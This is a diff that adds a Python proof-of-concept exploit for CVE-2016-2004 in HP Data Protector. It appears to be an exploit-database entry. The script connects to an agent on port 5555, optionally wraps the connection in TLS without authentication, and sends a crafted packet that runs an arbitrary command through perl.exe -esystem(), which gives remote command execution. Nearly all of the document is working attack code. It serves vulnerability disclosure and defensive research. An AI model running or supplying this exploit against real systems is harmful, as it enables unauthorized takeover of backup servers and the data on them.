@@ -1,0 +1,154 @@
+#!/usr/bin/python
+#
+# Exploit Title: Data Protector Encrypted Communications
+# Date: 26-05-2016
+# Exploit Author: Ian Lovering
+# Vendor Homepage: http://www8.hp.com/uk/en/software-solutions/data-protector-backup-recovery-software/
+# Version: A.09.00 and earlier
+# Tested on: Windows Server 2008
+# CVE : CVE-2016-2004
+#
+
+#   This proof of concept demonstrates that enabling encrypted control communication on
+#   Data Protector agents does not provide any additional security.
+#   As is provides no authentication it is not a viable workaround to prevent the
+#   exploitation of well known Data Protector issues such as cve-2014-2623
+#
+#   This exploit establishes and unauthenticated encrypted communication channel to 
+#   a Data Protector Agent and uses a well known unencrypted Data Protector vulnerability
+#   to run arbitrary commands on the target.
+
+#   Tested on Kali Linux 2 with python 2.7.9
+#   Tested against Data Protector A.09.00 (Internal Build version 88) with encrypted control
+#   communication enabled.
+#   All other Data Protector settings are default.
+#   Tested against Data Protector agent running on Windows 2008 R2
+#   Also tested against Data Protector A.07
+#
+#   encrypted-dataprotector.py -e <ipaddress>
+#
+#   By default runs ipconfig on the target. 
+#   Can take a little while to return. Have patience ;)
+#
+#   CVE-2016-2004
+
+import socket
+import ssl
+import time
+import struct
+import argparse
+
+
+parser = argparse.ArgumentParser(prog='test-encrypt.py')
+parser.add_argument('-e', '--encrypt', dest='encrypt', action='store_true')
+parser.add_argument('-p', '--port', type=int)
+parser.add_argument('-c', '--command')
+parser.add_argument('ipaddress')
+parser.set_defaults(encrypt=False,port=5555)
+args = parser.parse_args()
+
+HOST = args.ipaddress
+PORT = args.port
+
+command = 'ipconfig'
+
+if args.command:
+    command = args.command
+
+# initialise data
+initdata = ("\x00\x00\x00\x48\xff\xfe\x32\x00\x36\x00\x37\x00\x00\x00\x20\x00"
+        "\x31\x00\x30\x00\x00\x00\x20\x00\x31\x00\x30\x00\x30\x00\x00\x00"
+        "\x20\x00\x39\x00\x30\x00\x30\x00\x00\x00\x20\x00\x38\x00\x38\x00"
+        "\x00\x00\x20\x00\x6f\x00\x6d\x00\x6e\x00\x69\x00\x64\x00\x6c\x00"
+        "\x63\x00\x00\x00\x20\x00\x34\x00\x00\x00\x00\x00")
+
+OFFSET = 46
+command = command.replace("\\", "\\\\")
+command = command.replace("\'", "\\\'")
+command_length = struct.pack(">I",OFFSET + len(command))
+payload = command_length         +\
+    "\x32\x00\x01\x01\x01\x01\x01\x01" +\
+    "\x00\x01\x00\x01\x00\x01\x00\x01" +\
+    "\x01\x00\x20\x32\x38\x00\x5c\x70" +\
+    "\x65\x72\x6c\x2e\x65\x78\x65\x00" +\
+    "\x20\x2d\x65\x73\x79\x73\x74\x65" +\
+    "\x6d('%s')\x00" % command
+
+def get_data(sock):
+    response = ''
+    recv_len =1
+    
+    while recv_len:
+        data = sock.recv(4096)
+        recv_len = len(data)
+        response += data
+        if recv_len < 4096:
+            break
+    
+    return response
+
+def get_dp_response(sock):
+
+    print "===== Response ====="
+    print
+
+    while True:
+
+        # Get information about response
+        packed_length = sock.recv(4)
+        if not packed_length: 
+            break
+        n = struct.unpack(">I", packed_length)[0]
+        tmpresponse = sock.recv(n)
+        tmpresponse = tmpresponse.replace("\n", "")
+        tmpresponse = tmpresponse.replace("\x00", "")
+        tmpresponse = tmpresponse.replace("\xff\xfe\x39\x20", "")
+        if tmpresponse.upper().find("*RETVAL*") != -1:
+            break
+        else:
+            print tmpresponse
+
+    print
+    print "===== End ====="
+    print
+
+
+client = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
+
+if args.encrypt:
+    context = ssl.create_default_context()
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+    context.set_ciphers('ALL')
+
+try:
+    client.connect(( HOST, PORT ))
+    print "Connected" 
+
+    if args.encrypt:
+        # send data protector init string
+        client.send(initdata)
+        response = get_data(client)
+
+        # setup tls
+        client = context.wrap_socket(client)
+        print "Encryption Enabled"
+    
+    # send payload
+    client.send(payload)
+    print "Sent Payload"
+    print ""
+    print "===== Command ====="
+    print
+    print command
+    print
+    get_dp_response(client)
+
+    client.close()
+
+except Exception as e:
+    print '[*] Exception. Exiting.'
+    print e
+    client.close()
+
+
